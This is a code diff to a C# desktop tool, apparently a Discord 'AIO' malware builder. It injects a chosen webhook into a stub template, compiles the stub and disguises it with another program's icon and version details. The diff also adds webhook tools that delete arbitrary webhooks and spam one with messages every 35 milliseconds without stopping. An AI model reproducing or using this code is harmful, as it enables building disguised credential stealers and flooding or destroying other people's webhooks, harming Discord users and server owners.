@@ -22,6 +22,10 @@ using System.Net.Sockets;
 using System.ComponentModel;
 using System.Net.Http.Headers;
 using Newtonsoft.Json.Linq;
+using Path = System.IO.Path;
+using Microsoft.IdentityModel.Tokens;
+using System.Linq.Expressions;
+using System.Threading;
 
 namespace discord_aio_release
 {
@@ -35,11 +39,15 @@ namespace discord_aio_release
             InitializeComponent();
             settings_shadow.Opacity = 0;
             builder_shadow.Opacity = 0;
-            builder_site.Opacity = 0;
+            webhooks_shadow.Opacity = 0;
+            builder_site.Visibility = Visibility.Collapsed;
+            webhooks_site.Visibility = Visibility.Collapsed;
+            hover_elipse.Opacity = 0;
             version_label.Content = _v + " " + hwid.ToUpper();
             username_label.Content = Environment.UserName;
             _serializedToken = serializedToken;
             _DP = _DAIO;
+            avatarHandler();
             WebHandler();
             this.metadata = new Metadata(this.ranChars);
             RefTick();
@@ -83,7 +91,7 @@ namespace discord_aio_release
 
         private async void WebHandler()
         {
-            string warning_url = "WARNINGURL";
+            string warning_url = "WARNING";
             using (HttpClient client = new HttpClient())
             {
                 // Warning logic
@@ -101,21 +109,17 @@ namespace discord_aio_release
                 {
                     warning_label.Content = "An error occured. Please, contact the developers.";
                 }
+            }
+        }
 
-                // User avatar logic (simple as for no accounts now)
-                try
-                {
-                    var img = new Image();
-                    string iURL = "AVATARURL"; // Make logic to retrieve image by login name
-
-                    BitmapImage bitmap = new BitmapImage();
-                    bitmap.BeginInit();
-                    bitmap.UriSource = new Uri(iURL, UriKind.Absolute);
-                    bitmap.EndInit();
-
-                    user_avatar.ImageSource = bitmap;
-                }
-                catch { }
+        private async void avatarHandler()
+        {
+            string avPath = Path.Combine(_DP, "avatar.png");
+            if (File.Exists(avPath))
+            {
+                BitmapImage img = new BitmapImage(new Uri(Path.Combine(_DP, "avatar.png")));
+                WriteableBitmap tImg = new WriteableBitmap(img);
+                user_avatar.ImageSource = tImg;
             }
         }
 
@@ -132,7 +136,7 @@ namespace discord_aio_release
         // Dragging the window
         private void Window_MouseDown(object sender, MouseButtonEventArgs e)
         {
-            if (e.ChangedButton == MouseButton.Left)
+            if (e.ChangedButton == MouseButton.Left && e.OriginalSource is FrameworkElement source && source.Name != "hover_elipse")
                 this.DragMove();
         }
 
@@ -141,14 +145,17 @@ namespace discord_aio_release
         {
             builder_image.Source = this.FindResource("dToolDrawingImageEEE") as ImageSource;
             builder_shadow.Opacity = 0;
-            builder_site.Opacity = 0;
+            builder_site.Visibility = Visibility.Collapsed;
+            webhooks_image.Source = this.FindResource("webhook_ncolored") as ImageSource;
+            webhooks_shadow.Opacity = 0;
+            webhooks_site.Visibility = Visibility.Collapsed;
             settings_image.Source = this.FindResource("dSetsDrawingImageEEE") as ImageSource;
             settings_shadow.Opacity = 0;
 
             dashboard_image.BeginAnimation(OpacityProperty, anim);
             dashboard_image.Source = this.FindResource("dashboard_colored") as ImageSource;
             dashboard_shadow.Opacity = 1;
-            dashboard_site.Opacity = 1;
+            dashboard_site.Visibility = Visibility.Visible;
         }
 
         // Builder button
@@ -156,14 +163,35 @@ namespace discord_aio_release
         {
             dashboard_image.Source = this.FindResource("dashboard_ncolored") as ImageSource;
             dashboard_shadow.Opacity = 0;
-            dashboard_site.Opacity = 0;
+            dashboard_site.Visibility = Visibility.Collapsed;
+            webhooks_image.Source = this.FindResource("webhook_ncolored") as ImageSource;
+            webhooks_shadow.Opacity = 0;
+            webhooks_site.Visibility = Visibility.Collapsed;
             settings_image.Source = this.FindResource("dSetsDrawingImageEEE") as ImageSource;
             settings_shadow.Opacity = 0;
 
             builder_image.BeginAnimation(OpacityProperty, anim);
             builder_image.Source = this.FindResource("dToolDrawingImage") as ImageSource;
             builder_shadow.Opacity = 1;
-            builder_site.Opacity = 1;
+            builder_site.Visibility = Visibility.Visible;
+        }
+
+        // Webhooks button
+        private void webhooks_button_Click(object sender, RoutedEventArgs e)
+        {
+            dashboard_image.Source = this.FindResource("dashboard_ncolored") as ImageSource;
+            dashboard_shadow.Opacity = 0;
+            dashboard_site.Visibility = Visibility.Collapsed;
+            builder_image.Source = this.FindResource("dToolDrawingImageEEE") as ImageSource;
+            builder_shadow.Opacity = 0;
+            builder_site.Visibility = Visibility.Collapsed;
+            settings_image.Source = this.FindResource("dSetsDrawingImageEEE") as ImageSource;
+            settings_shadow.Opacity = 0;
+
+            webhooks_image.BeginAnimation(OpacityProperty, anim);
+            webhooks_image.Source = this.FindResource("webhook_colored") as ImageSource;
+            webhooks_shadow.Opacity = 1;
+            webhooks_site.Visibility = Visibility.Visible;
         }
 
         // Settings button
@@ -171,10 +199,13 @@ namespace discord_aio_release
         {
             dashboard_image.Source = this.FindResource("dashboard_ncolored") as ImageSource;
             dashboard_shadow.Opacity = 0;
-            dashboard_site.Opacity = 0;
+            dashboard_site.Visibility = Visibility.Collapsed;
             builder_image.Source = this.FindResource("dToolDrawingImageEEE") as ImageSource;
             builder_shadow.Opacity = 0;
-            builder_site.Opacity = 0;
+            builder_site.Visibility = Visibility.Collapsed;
+            webhooks_image.Source = this.FindResource("webhook_ncolored") as ImageSource;
+            webhooks_shadow.Opacity = 0;
+            webhooks_site.Visibility = Visibility.Collapsed;
 
             settings_image.BeginAnimation(OpacityProperty, anim);
             settings_image.Source = this.FindResource("dSetsDrawingImage") as ImageSource;
@@ -190,7 +221,7 @@ namespace discord_aio_release
         // Webhook checker
         private void webhook_button_Click(object sender, RoutedEventArgs e)
         {
-            if (!String.IsNullOrEmpty(webhook_input.Text) || !String.IsNullOrWhiteSpace(webhook_input.Text))
+            if (!String.IsNullOrEmpty(webhook_input.Text) && !String.IsNullOrWhiteSpace(webhook_input.Text))
             {
                 try
                 {
@@ -228,7 +259,7 @@ namespace discord_aio_release
                 bool? dialogResult = cloneDialog.ShowDialog();
                 if (dialogResult == true)
                 {
-                    string path = System.IO.Path.GetFullPath(cloneDialog.FileName);
+                    string path = Path.GetFullPath(cloneDialog.FileName);
 
                     FileVersionInfo info = FileVersionInfo.GetVersionInfo(path);
 
@@ -287,19 +318,165 @@ namespace discord_aio_release
                         if (iconLabel != "None" && !string.IsNullOrEmpty(iconLabel))
                             appIcon = iconLabel;
 
-                        if (File.Exists(System.IO.Path.Combine(_DP, "stub.cs")))
-                            File.Delete(System.IO.Path.Combine(_DP, "stub.cs"));
+                        if (File.Exists(Path.Combine(_DP, "stub.cs")))
+                            File.Delete(Path.Combine(_DP, "stub.cs"));
 
-                        string main_sc = File.ReadAllText(System.IO.Path.Combine(_DP, "Program.cs"));
+                        string main_sc = File.ReadAllText(Path.Combine(_DP, "Program.cs"));
                         main_sc = main_sc.Replace("%WEBHOOK%", webhook_input.Text); // Changing the webhook
 
-                        File.WriteAllText(System.IO.Path.Combine(_DP, "stub.cs"), main_sc);
+                        File.WriteAllText(Path.Combine(_DP, "stub.cs"), main_sc);
 
                         string arguments = $"{_serializedToken} {builder.FileName} {appIcon}";
                         Process.Start(_DP + "\\daioCompiler.exe", arguments);
                     }
                 }
                 catch { }
+            }
+        }
+
+        private void hover_elipse_MouseEnter(object sender, MouseEventArgs e)
+        {
+            hover_elipse.Opacity = 1;
+            this.Cursor = Cursors.Hand;
+        }
+
+        private void hover_elipse_MouseLeave(object sender, MouseEventArgs e)
+        {
+            hover_elipse.Opacity = 0;
+            this.Cursor = Cursors.Arrow;
+        }
+
+        private void hover_elipse_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            string avatarPath = Path.Combine(_DP, "avatar.png");
+            try
+            {
+                OpenFileDialog avatarDialog = new OpenFileDialog();
+                avatarDialog.Title = "Select avatar";
+                avatarDialog.Filter = "Image (*.png)|*.png";
+
+                bool? dialogResult = avatarDialog.ShowDialog();
+                if (dialogResult == true)
+                {
+                    File.Copy(avatarDialog.FileName, avatarPath, true);
+                    BitmapImage img = new BitmapImage(new Uri(avatarPath));
+                    WriteableBitmap tImg = new WriteableBitmap(img);
+                    user_avatar.ImageSource = tImg;
+                }
+            }
+            catch { MessageBox.Show("Please wait a moment before proceeding with this action."); }
+        }
+
+        private string wh_msg_title { get; set; }
+        private string wh_msg_desc { get; set; }
+        private string wh_msg_user { get; set; }
+
+        private void webhook_button2_Click(object sender, RoutedEventArgs e)
+        {
+            if (!String.IsNullOrEmpty(webhook_input2.Text) && !String.IsNullOrWhiteSpace(webhook_input2.Text))
+            {
+                try
+                {
+                    string wh_ = new WebClient().DownloadString(webhook_input2.Text);
+                    MessageBox.Show("valid");
+                }
+                catch { MessageBox.Show("not valid"); }
+            }
+        }
+
+        private async void webhook_send_msg(object sender, RoutedEventArgs e)
+        {
+            if (!String.IsNullOrEmpty(webhook_input2.Text) && !String.IsNullOrWhiteSpace(webhook_input2.Text))
+            {
+                if (!String.IsNullOrEmpty(msg_title_input.Text) && !String.IsNullOrWhiteSpace(msg_title_input.Text)
+                    && !String.IsNullOrEmpty(msg_desc_input.Text) && !String.IsNullOrWhiteSpace(msg_desc_input.Text)
+                    && !String.IsNullOrEmpty(msg_user_input.Text) && !String.IsNullOrWhiteSpace(msg_user_input.Text))
+                {
+                    try
+                    {
+                        HttpClient webhookClient = new HttpClient();
+                        webhookClient.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
+
+                        string content = (@"{""embeds"": [{""title"": ""{0}"",""description"": ""{1}"",""color"": 393130}],""username"": ""{2}""}").Replace("{0}", msg_title_input.Text).Replace("{1}", msg_desc_input.Text).Replace("{2}", msg_user_input.Text);
+                        var data = new StringContent(content, Encoding.UTF8, "application/json");
+
+                        HttpResponseMessage res = await webhookClient.PostAsync(webhook_input2.Text, data);
+                    }
+                    catch { }
+                }
+            }
+        }
+
+        private async void webhook_delete(object sender, RoutedEventArgs e)
+        {
+            if (!String.IsNullOrEmpty(webhook_input2.Text) && !String.IsNullOrWhiteSpace(webhook_input2.Text))
+            {
+                try
+                {
+                    HttpClient webhookClient = new HttpClient();
+                    HttpResponseMessage res = await webhookClient.DeleteAsync(webhook_input2.Text);
+                    MessageBox.Show("Webhook deleted.");
+                }
+                catch { }
+            }
+        }
+
+        private bool masMsgActive = false;
+
+        private async void webhook_send_massive_msg(object sender, RoutedEventArgs e)
+        {
+            if (!String.IsNullOrEmpty(webhook_input2.Text) && !String.IsNullOrWhiteSpace(webhook_input2.Text))
+            {
+                if (!String.IsNullOrEmpty(msg_title_input.Text) && !String.IsNullOrWhiteSpace(msg_title_input.Text)
+                    && !String.IsNullOrEmpty(msg_desc_input.Text) && !String.IsNullOrWhiteSpace(msg_desc_input.Text)
+                    && !String.IsNullOrEmpty(msg_user_input.Text) && !String.IsNullOrWhiteSpace(msg_user_input.Text))
+                {
+                    if (!masMsgActive) 
+                    {
+                        string post_webhook = webhook_input2.Text;
+
+                        HttpClient webhookClient = new HttpClient();
+                        webhookClient.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
+
+                        string content = (@"{""embeds"": [{""title"": ""{0}"",""description"": ""{1}"",""color"": 393130}],""username"": ""{2}""}").Replace("{0}", msg_title_input.Text).Replace("{1}", msg_desc_input.Text).Replace("{2}", msg_user_input.Text);
+                        var data = new StringContent(content, Encoding.UTF8, "application/json");
+
+                        masMsgActive = true;
+                        start_wb_button.Content = "S T A R T E D";
+                        stop_wb_button.Content = "S T O P";
+
+                        await Task.Run(async () =>
+                        {
+                            CancellationTokenSource cts = new CancellationTokenSource();
+                            while (masMsgActive)
+                            {
+                                try
+                                {
+                                    HttpResponseMessage res = await webhookClient.PostAsync(post_webhook, data);
+                                    await Task.Delay(35);
+                                }
+                                catch
+                                {
+                                    masMsgActive = false;
+                                    await Task.Delay(500);
+                                    masMsgActive = true;
+                                }
+                            }
+                            cts.Cancel();
+                        });
+                    }
+                }
+            }
+        }
+
+        private void webhook_stop_massive_msg(object sender, RoutedEventArgs e)
+        {
+            if (masMsgActive)
+            {
+                masMsgActive = false;
+                start_wb_button.Content = "S T A R T";
+                stop_wb_button.Content = "S T O P P E D";
+                MessageBox.Show("Massive messaging stopped.");
             }
         }
     }
